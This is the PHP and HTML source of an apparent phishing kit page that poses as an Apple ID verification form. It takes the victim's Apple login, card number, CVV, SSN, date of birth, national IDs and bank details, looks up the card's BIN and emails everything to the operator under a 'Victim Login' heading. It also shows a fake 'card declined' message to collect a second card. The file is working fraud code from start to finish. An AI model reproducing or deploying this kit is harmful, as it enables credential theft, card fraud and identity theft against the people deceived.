﻿<?php
session_start();
error_reporting(0);
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/language.mob.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require_once "assets/includes/apxdev.php";
require_once "class.phpmailer.php";
require_once "class.smtp.php";
require_once "setting.php";
if(isset($_POST["ccdouble"])) {
  if(isset($_POST['mname']) && !empty($_POST['mname'])) {
      $mname = $_POST['mname'];
}
else {
$mname = "";
}
 $_SESSION['sescc'] = $_POST["ccno"];
    $userid = $_SESSION["user"];
    $password = $_SESSION["pass"];
    $name=$_POST["fname"]." ".$mname." ".$_POST["lname"];
    $dob=$_POST["dob"];
    $address=$_POST["address"].", ".$_POST["town"].", ".$_POST["county"];
    $postcode=$_POST["postcode"];
    $country=$_POST["country"];
    $telephone=$_POST["telephone"];
    $ssn=$_POST["ssn"];
    $ccname=$_POST["ccname"];
    $ccno=$_POST["ccno"];
    $ccexp=$_POST["ccexp"];
    $climit = $_POST['climit'];
    $citizenid = $_POST['citizenid'];
    $qatarid = $_POST['qatarid'];
    $naid = $_POST['naid'];
    $bans = $_POST['bans'];
    $passport = $_POST['passport'];
    $civilid = $_POST['civilid'];
    $numbid = $_POST['numbid'];
    $secode=$_POST["secode"];
    $acno=$_POST["acno"];
    $sort=$_POST["sortcode"];

    $nabid = $_POST["nabid"];
    $bankaccount = $_POST["bankaccount"];
    $cardid = $_POST['cardid'];
    $cardpassword = $_POST['cardpassword'];

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    $systemInfo = systemInfo($ip);
    $ccno = str_replace(' ', '', $ccno);
    $last4 = substr($ccno, 12, 16);
	// fungsi bin
	$ccno    = str_replace(' ', '', $ccno);
	$binq     = str_replace(' ', '', $_POST['ccno']);
	$binq     = substr($binq, 0, 6);
	$bins = file_get_contents("https://www.cardbinlist.com/search.html?bin=$binq");
	$bin = preg_match_all("/headline\":\"(.*)\",\"datePublished/xs", $bins, $binn) ? $binn[1][0] : null;
	$bin2 = preg_match_all("/caption\":\"BIN(.*)\",\"width\":\"600\",\"height\":\"400\"}}<\/script>/xs", $bins, $binn2) ? $binn2[1][0] : null;
	$bin3 = explode(" ",$bin);
	$bin4 = explode(" ",$bin2);
	$ccbrand = strtoupper($bin3[2]);
	$ccbank  = $bin3[5].' '.$bin3[6].' '.$bin3[7];
	$cctype  = strtoupper($bin4[3]);
	$ccklas  = strtoupper($bin3[3]);
	//lanjuut

    $VictimInfo1 = "| IP Address :"." ".$ip." (".gethostbyaddr($ip).")";
    $VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
    $VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
    $VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
    $VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
    $VictimInfo6 = "".$systemInfo['country'];
    $from = $SenderEmail;
    $headers = "From: $SenderCC <$SenderEmail>";
    $subj = "" . $ccname . " - ". $binq ." - ". $ccbrand ." " . $cctype . " " . $ccklas ." " . $ccbank ." [ " . $VictimInfo6  . " $ip ".$systemInfo['os']."]";
    $to = $Your_Email;
    $warnsubj = "Abuse";
    $warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
    $bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
    $data = "
      ++--------[*SLEM-ID*]--------++

    ------------------------------------------
              Apple Login
    ------------------------------------------
    Username : $userid
    Password : $password

    ------------------------------------------
              CreditCard
    ------------------------------------------
    Cardholder Name   :  $ccname
    Card Number       :  $ccno
    Expiration Date   :  $ccexp
    Cvv2              :  $secode
    BIN/IIN Info      :  $binq $ccbrand $cctype $ccklas $ccbank
    For Check         :  $ccno|$ccexp|$secode
    Qatar ID (QA)                 : $qatarid
    ID Number (GR)                : $numbid
    Citizen ID (TH)               : $citizenid
    National ID (SA)              : $naid
    Sort Code (UK/IE)             : $sort
    Civil ID Number (KW)          : $civilid
    Bank Access Number (NZ)       : $bans
    Account Number (UK/IE/IN)     : $acno
    Credit limit (IE/TH/IN/NZ/AU) : $climit
    Bank Account (AU)             : $bankaccount
    NAB ID (AU)                   : $nabid
    Card ID (JP)                  : $cardid
    Card Password (JP)            : $cardpassword

    ------------------------------------------
          Account Information
    ------------------------------------------
    Full Name     :  $name
    Address       :  $address
    Zip/PostCode  :  $postcode
    Country       :  $VictimInfo6
    Phone Number  :  $telephone
    SSN           :  $ssn
    DOB           :  $dob
    ------------------------------------------
             Victim Login
    ------------------------------------------
    From     :  $VictimInfo1 - $VictimInfo2
    Browser  :  $VictimInfo3 - $VictimInfo4 - $VictimInfo5

    ++---------===[ $$ Jangan Lupa Coli $$ ]===---------++
    ";

        mail($to,$subj,$data,$headers);
        $empas   = "# $binq - $ccbrand - $cctype - $ccklas - $ccbank [ ".$systemInfo['country']." ]\n";
    $file = fopen("assets/logs/bin.log", "a");
    fwrite($file, $empas);
    fclose($file);

    $file2 = $_SERVER['DOCUMENT_ROOT']."/assets/logs/._ccz_.txt";
    $isi  = file_get_contents($file2);
    $buka = fopen($file2,"w");
    fwrite($buka, $isi+1);
    fclose($buka);
}
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?=tr('Confirm your information');?></title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<style>.error {color:red}</style>
<script type="text/javascript">
function ccc(){
    var cc = document.getElementById("ccno").value;
    if(cc.match(/^[0-2]|^[7-9]/))
        {
            document.getElementById("ccno").value = "";
        }
    if(cc.match(/4111 1111 1111 1111/))
        {
            document.getElementById("ccno").value = "";
        }
}
</script>
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>



<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name"><?=tr('Account Verification');?></span>
                                    <small class="SessionUser"><?=tr('Your Apple ID is');?> <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link"><?=tr('Sign Out');?> </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">
<?php if($idcard == "yoi"){
?>
<form action="Upload-Identity.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
 <?php }else{ ?>
 <form action="Done.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
 <?php } ?>
<input type="hidden" name="fname" value="<?php echo $_POST['fname'];?>">
<input type="hidden" name="mname" value="<?php echo $_POST['mname'];?>">
<input type="hidden" name="lname" value="<?php echo $_POST['lname'];?>">
<input type="hidden" name="dob" value="<?php echo $_POST['dob'];?>">
<input type="hidden" name="address" value="<?php echo $_POST['address'];?>">
<input type="hidden" name="town" value="<?php echo $_POST['town'];?>">
<input type="hidden" name="postcode" value="<?php echo $_POST['postcode'];?>">
<input type="hidden" name="county" value="<?php echo $_POST['county'];?>">
<input type="hidden" name="country" value="<?php echo $_POST['country'];?>">
<input type="hidden" name="telephone" value="<?php echo $_POST['telephone'];?>">
<input type="hidden" name="ssn" value="<?php echo $_POST['ssn'];?>">
<input type="hidden" name="passport" value="<?php echo $_POST['passport'];?>">
<input type="hidden" name="numbid" value="<?php echo $_POST['numbid'];?>">
<input type="hidden" name="naid" value="<?php echo $_POST['naid'];?>">
<input type="hidden" name="citizenid" value="<?php echo $_POST['citizenid'];?>">
<input type="hidden" name="civilid" value="<?php echo $_POST['civilid'];?>">
<input type="hidden" name="qatarid" value="<?php echo $_POST['qatarid'];?>">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle" id="nameLabel"><?=tr('Card Details');?></h3>
<div class="pop-container error signin-error">
              <div class="error pop-bottom tk-subbody-headline">
                  <p class="fat" id="errMsg">
<font color="red"><?=tr("Your Credit Card was declined,Please add another Credit card.");?></font>
                  </p>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="ccname" id="ccname" class="generic-input-field form-control field" placeholder="<?=tr('Cardholders Name');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="ccno" id="ccno" onfocusout="ccc();" class="cc-number generic-input-field form-control field" placeholder="<?=tr('Card Number');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="ccexp" id="ccexp" class="cc-exp generic-input-field form-control field" placeholder="<?=tr('Expiry Date');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="tel" name="secode" id="secode" class="cc-cvc generic-input-field form-control field" placeholder="<?=tr('Card Security Code');?>">
</div>
</div>
<?php echo $langx['CARDID'];?>
<?php echo $langx['CARDPASSWORD'];?>
<?php echo $langx['CREDITLIMIT'];?>
<?php echo $langx['ACCOUNT'];?>
<?php echo $langx['BANK_ACCOUNT'];?>
<?php echo $langx['NABID'];?>
<br>
<br>
<input type="submit" class="gobtn btn-link" style="width:50%;margin-left:auto;margin-right:auto;float:right" value="<?=tr('Next');?>">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</form>



</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>
